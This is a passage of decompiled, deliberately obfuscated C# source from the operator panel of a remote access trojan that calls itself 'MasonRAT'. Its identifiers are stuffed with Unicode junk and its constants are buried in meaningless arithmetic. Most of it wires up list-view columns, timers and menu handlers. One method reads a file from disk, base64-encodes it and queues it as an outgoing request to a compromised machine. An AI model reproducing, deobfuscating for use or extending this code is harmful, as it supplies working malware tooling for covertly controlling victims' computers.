      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـ\u060C\u060Aـ\u060Dڟـ\u0608ۏﻼ\u060Eڙ\u0020ــٻــــ);
      Timer masonRatٸڙڠــ̨̍ٺڙ1 = this.\u2694️MasonRAT\u270C\u0609\u060Dٸ\u060Eڙڠــ̍\u060Ą\u060D\u0608ٺڙ;
      if (masonRatٸڙڠــ̨̍ٺڙ1 != null)
        masonRatٸڙڠــ̨̍ٺڙ1.Tick -= eventHandler;
      this.\u2694️MasonRAT\u270C\u0609\u060Dٸ\u060Eڙڠــ̍\u060Ą\u060D\u0608ٺڙ = value;
      Timer masonRatٸڙڠــ̨̍ٺڙ2 = this.\u2694️MasonRAT\u270C\u0609\u060Dٸ\u060Eڙڠــ̍\u060Ą\u060D\u0608ٺڙ;
      if (masonRatٸڙڠــ̨̍ٺڙ2 == null)
        return;
      masonRatٸڙڠــ̨̍ٺڙ2.Tick += eventHandler;
    }
  }

  [field: AccessedThroughProperty("Guna2Elipse1")]
  internal virtual Guna2Elipse \u2694️MasonRAT\u270Cڙٻ\u0608ـــڙـئﮪۙٺ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual Guna2CustomGradientPanel \u2694️MasonRAT\u270Cءـڛٺ\u060Aٽۏڼـۨ\u060Dد\u0608ڙۏـ\u0609ﻋ̨\u0609
  {
    get => this.\u2694️MasonRAT\u270C\u0609ء\u0020ـ\u0608ــﻻڟ\u060Fـ\u060Aــــ\u0608ــڙ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      PaintEventHandler paintEventHandler = new PaintEventHandler(this.\u2694️MasonRAT\u270Cټ\u060E̍ٸ\u060Dـڙـدبڝـ\u060Dـٺ);
      Guna2CustomGradientPanel ratءـــﻻڟـــــــڙ1 = this.\u2694️MasonRAT\u270C\u0609ء\u0020ـ\u0608ــﻻڟ\u060Fـ\u060Aــــ\u0608ــڙ;
      if (ratءـــﻻڟـــــــڙ1 != null)
        ratءـــﻻڟـــــــڙ1.Paint -= paintEventHandler;
      this.\u2694️MasonRAT\u270C\u0609ء\u0020ـ\u0608ــﻻڟ\u060Fـ\u060Aــــ\u0608ــڙ = value;
      Guna2CustomGradientPanel ratءـــﻻڟـــــــڙ2 = this.\u2694️MasonRAT\u270C\u0609ء\u0020ـ\u0608ــﻻڟ\u060Fـ\u060Aــــ\u0608ــڙ;
      if (ratءـــﻻڟـــــــڙ2 == null)
        return;
      ratءـــﻻڟـــــــڙ2.Paint += paintEventHandler;
    }
  }

  [field: AccessedThroughProperty("Guna2ControlBox2")]
  internal virtual Guna2ControlBox \u2694️MasonRAT\u270Cـ\u060A\u060Dـ\u060Bـ\u060Fـ\u060Cْۛبٺ\u060Eـ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("Guna2ControlBox1")]
  internal virtual Guna2ControlBox \u2694️MasonRAT\u270Cــــئۡـ\u0608ۧـــٽـ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("Guna2GroupBox1")]
  internal virtual Guna2GroupBox \u2694️MasonRAT\u270Cۙؤـ\u060Aٸ\u060Dٸ\u060Aْئ\u060Fط\u0608ٻ\u060D̍\u060F { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("StatusStrip1")]
  internal virtual StatusStrip \u2694️MasonRAT\u270Cټطـ\u060Eـ\u0020\u060Dْٸـءــ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ToolStripStatusLabel1")]
  internal virtual ToolStripStatusLabel \u2694️MasonRAT\u270C\u060A\u060D\u0609ٻ\u060B\u0020\u0609ٸ\u0608\u060D\u060B { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ToolStripStatusLabel2")]
  internal virtual ToolStripStatusLabel \u2694️MasonRAT\u270Cﯧۛ̍اڜ\u0020\u060D\u060Aڠ\u060Aڣةـﻻ\u060Aﻻ\u0608ــ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("Guna2DragControl1")]
  internal virtual Guna2DragControl \u2694️MasonRAT\u270Cٺ\u060Aـ\u060A\u060Dـڜـ\u0608ڕـ\u060B { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ColumnHeader2")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270Cڜ\u060Dٻ\u060Aڅ\u060A\u060C\u0608د̍\u060Fﯧ\u060Aــمڜ\u060Aـ\u0020 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ColumnHeader4")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270C\u060Fــــ\u060Eٽ\u060C̍ــٽ̨ـڅ\u060Ąـۡـ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ColumnHeader5")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270C\u0608\u060A\u0608ﻻڙـڙـءـټ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ColumnHeader6")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270C\u060Aﯧﻋدـټ\u060Fۙ\u060A\u060A\u060Aﻋ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ColumnHeader7")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270Cـؤ\u060Aـ̨ـ\u060Aڙּۙـ\u060D { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ColumnHeader8")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270Cـ\u060D\u060D\u060E\u060A\u0609ۨ\u0608ؤــ\u0608\u0608ۏـ\u060B\u0609 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ColumnHeader9")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270Cڙڅڛْ\u060A\u060Eڙ\u0609\u060Cﻋ\u0608 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ColumnHeader10")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270Cﻻــ\u0608ـاـ\u0608ﻻ\u0608\u060F\u0608 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual Guna2ContextMenuStrip \u2694️MasonRAT\u270Cــ̍ـټﻻ\u060E؁طـۙ\u060A\u0609\u0608ڙ\u060B\u060Aـد
  {
    get => this.\u2694️MasonRAT\u270Cڙ\u060Dـ\u060D\u060Bحـڕـةڜ\u060Fـط\u060F;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      CancelEventHandler cancelEventHandler = new CancelEventHandler(this.\u2694️MasonRAT\u270Cـح\u060B\u060Dڣۭ\u060Eـڣڙح);
      Guna2ContextMenuStrip masonRatڙـحـڕـةڜـط1 = this.\u2694️MasonRAT\u270Cڙ\u060Dـ\u060D\u060Bحـڕـةڜ\u060Fـط\u060F;
      if (masonRatڙـحـڕـةڜـط1 != null)
        masonRatڙـحـڕـةڜـط1.Opening -= cancelEventHandler;
      this.\u2694️MasonRAT\u270Cڙ\u060Dـ\u060D\u060Bحـڕـةڜ\u060Fـط\u060F = value;
      Guna2ContextMenuStrip masonRatڙـحـڕـةڜـط2 = this.\u2694️MasonRAT\u270Cڙ\u060Dـ\u060D\u060Bحـڕـةڜ\u060Fـط\u060F;
      if (masonRatڙـحـڕـةڜـط2 == null)
        return;
      masonRatڙـحـڕـةڜـط2.Opening += cancelEventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـــد\u0609ڣـﻻ\u060Dڠ\u060B\u060Dـﻻا̍ـڦ\u060Eٺ
  {
    get => this.\u2694️MasonRAT\u270Cڙْ\u060Cژ\u060A\u060Aڼڙـ\u0609ۙ̍\u0608ـ\u060A\u0609ڛ\u0020ـڝ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cۡدڼـڙڜڙـٺـ\u0609ۙ\u060Dـ\u060B\u060A\u0608);
      ToolStripMenuItem masonRatڙْژڼڙـۙ̍ـڛـڝ1 = this.\u2694️MasonRAT\u270Cڙْ\u060Cژ\u060A\u060Aڼڙـ\u0609ۙ̍\u0608ـ\u060A\u0609ڛ\u0020ـڝ;
      if (masonRatڙْژڼڙـۙ̍ـڛـڝ1 != null)
        masonRatڙْژڼڙـۙ̍ـڛـڝ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cڙْ\u060Cژ\u060A\u060Aڼڙـ\u0609ۙ̍\u0608ـ\u060A\u0609ڛ\u0020ـڝ = value;
      ToolStripMenuItem masonRatڙْژڼڙـۙ̍ـڛـڝ2 = this.\u2694️MasonRAT\u270Cڙْ\u060Cژ\u060A\u060Aڼڙـ\u0609ۙ̍\u0608ـ\u060A\u0609ڛ\u0020ـڝ;
      if (masonRatڙْژڼڙـۙ̍ـڛـڝ2 == null)
        return;
      masonRatڙْژڼڙـۙ̍ـڛـڝ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـ\u0608\u060Bּدـى\u060D\u0608ۭـڝ\u060Aـة\u0608\u0609څۧ\u0609
  {
    get => this.\u2694️MasonRAT\u270Cــﻻڙبـٸ\u060Dۙ\u0609ئ\u060D;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cڇ\u0020\u0608\u060A\u0608\u060Cڞـ\u060Aــ);
      ToolStripMenuItem masonRatــﻻڙبـٸۙئ1 = this.\u2694️MasonRAT\u270Cــﻻڙبـٸ\u060Dۙ\u0609ئ\u060D;
      if (masonRatــﻻڙبـٸۙئ1 != null)
        masonRatــﻻڙبـٸۙئ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cــﻻڙبـٸ\u060Dۙ\u0609ئ\u060D = value;
      ToolStripMenuItem masonRatــﻻڙبـٸۙئ2 = this.\u2694️MasonRAT\u270Cــﻻڙبـٸ\u060Dۙ\u0609ئ\u060D;
      if (masonRatــﻻڙبـٸۙئ2 == null)
        return;
      masonRatــﻻڙبـٸۙئ2.Click += eventHandler;
    }
  }

  private void \u2694️MasonRAT\u270C\u060Fئ\u060B̍ـ̍ـ\u060Dـــ\u060B\u060Dــ(
    object sender,
    EventArgs e)
  {
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.Columns[0].TextAlign = HorizontalAlignment.Left;
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.Columns[1].TextAlign = HorizontalAlignment.Left;
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.Columns[((1938893277 > 29025044 ? 2 : 2) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 << 1) ^ 1700055068 - (1244198660 | 338475023) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 >> 1) >> (900287814 ^ 533945902 >> 184189549) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + -0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0)].TextAlign = HorizontalAlignment.Left;
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.Columns[(720258984 + (1810399885 | 2086065565) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 >> 1) ^ ~(2107307229 - 680006692 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + -0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 << 1)].TextAlign = HorizontalAlignment.Left;
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.Columns[(719816676 + -719816659 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ (151465079 | 701068795) - 701464042 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ -0].TextAlign = HorizontalAlignment.Left;
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.Columns[1391102281 + 1641248762 % 640125581 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + ~(850099245 + 902000630 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0 + 0].TextAlign = HorizontalAlignment.Left;
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.Columns[(2020881295 ^ 3) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - ((2020881301 ^ 19) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 << 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 << 1)].TextAlign = HorizontalAlignment.Left;
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.Columns[(1558244163 ^ 20) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + ~(142787491 + 1415456684 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 >> 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0)].TextAlign = HorizontalAlignment.Left;
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.Columns[((1487113471 > 1339270640 ? 962330149 : 1283106865) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + -0 ^ (1035715415 - 745678122 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 << 1 | (327132983 << 1950339568) - 1864602579 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 << 1))) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0].TextAlign = HorizontalAlignment.Left;
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.View = View.Details;
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.HideSelection = false;
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.OwnerDraw = true;
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.GridLines = false;
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.DrawColumnHeader += new DrawListViewColumnHeaderEventHandler(this.\u2694️MasonRAT\u270Cـﻻ\u060A\u0609ۡۛ\u0609ۙۙڜـٺ);
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.DrawItem += new DrawListViewItemEventHandler(this.\u2694️MasonRAT\u270Cڙـ\u0020ۡـ\u060Fـــڠٺ\u060D\u0609ـڞ\u0608\u0609؁);
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.DrawSubItem += new DrawListViewSubItemEventHandler(this.\u2694️MasonRAT\u270C\u060A\u060Dڙڇژڙ\u060Aټـڙــټﻋ);
    this.\u2694️MasonRAT\u270Cــڕڙﻻؤ\u060Aد\u0609ۜ\u0608ٽ\u060Aــ\u0608\u060Dـڙ̍();
    this.\u2694️MasonRAT\u270Cـ\u0609\u0608بٺـ\u060Eﯧؤد\u0608\u0608ـټ\u0609.Start();
  }

  private void \u2694️MasonRAT\u270Cـﻻ\u060A\u0609ۡۛ\u0609ۙۙڜـٺ(
    object sender,
    DrawListViewColumnHeaderEventArgs e)
  {
    SolidBrush solidBrush = new SolidBrush(Color.FromArgb(((-428091 ^ 19) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 >> 1)) + ((910842722 > 657138640 ? 27399895 : 36533193) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 >> 1) >> 996734102 + (297340421 << 569072420) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 ^ 0, (42 - (305468359 >> 726096506) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 + 0 ^ -431786606 - -431786629 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 >> 1), (738320968 > 1212192315 ? 696640 : 522480) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - (17431750 + (1947654922 | 241772452) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 << 1) >> (611059764 - (747144565 >> 2049945652) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 ^ 0))) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0)));
    Color white = Color.White;
    e.DrawBackground();
    e.Graphics.FillRectangle((Brush) solidBrush, e.Bounds);
    TextRenderer.DrawText((IDeviceContext) e.Graphics, e.Header.Text, e.Font, e.Bounds, white);
  }

  private void \u2694️MasonRAT\u270Cڼۨ\u0609̍ڙڙڞد̍ــ\u0608ۡـ\u060D\u0609\u060C\u060E(
    object sender,
    DrawListViewColumnHeaderEventArgs e)
  {
    SolidBrush solidBrush = new SolidBrush(Color.FromArgb((-71348049 - (1849271309 >> 1277555369) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 >> 1)) + (74959932 + (1636409215 >> 181841338) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << -0, -551497390 - 1231696264 % 669363768 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 << 1) - ~((1113829942 ^ 24) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 << 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 ^ 0), ((319518348 > 1213900708 ? -5505 : -4129) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ -0) + ((-758166358 ^ ~1828330922) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 ^ 0) >> (-2059553829 ^ ~1361842006) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 << 1));
    Color white = Color.White;
    e.DrawBackground();
    e.Graphics.FillRectangle((Brush) solidBrush, e.Bounds);
    TextRenderer.DrawText((IDeviceContext) e.Graphics, e.Header.Text, e.Font, e.Bounds, white);
  }

  private void \u2694️MasonRAT\u270Cڙـ\u0020ۡـ\u060Fـــڠٺ\u060D\u0609ـڞ\u0608\u0609؁(
    object sender,
    DrawListViewItemEventArgs e)
  {
    e.DrawDefault = true;
  }

  private void \u2694️MasonRAT\u270C\u060A\u060Dڙڇژڙ\u060Aټـڙــټﻋ(
    object sender,
    DrawListViewSubItemEventArgs e)
  {
    e.DrawDefault = true;
  }

  private void \u2694️MasonRAT\u270C\u060B\u0609ا\u060Aﯧۜۡۏ\u060Cۡ(object sender, EventArgs e)
  {
    this.\u2694️MasonRAT\u270Cــڕڙﻻؤ\u060Aد\u0609ۜ\u0608ٽ\u060Aــ\u0608\u060Dـڙ̍();
  }

  public object \u2694️MasonRAT\u270Cــڕڙﻻؤ\u060Aد\u0609ۜ\u0608ٽ\u060Aــ\u0608\u060Dـڙ̍()
  {
    try
    {
      this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.Items.Clear();
      Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270C\u0608؁ڣـ\u060D\u060Aــﻋ؁\u060Eط̨ټژـۭ̍\u060D\u060A, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2757) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2758)))));
      Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
    object obj;
    return obj;
  }

  private void \u2694️MasonRAT\u270Cـ\u060C\u060Aـ\u060Dڟـ\u0608ۏﻼ\u060Eڙ\u0020ــٻــــ(
    object sender,
    EventArgs e)
  {
    try
    {
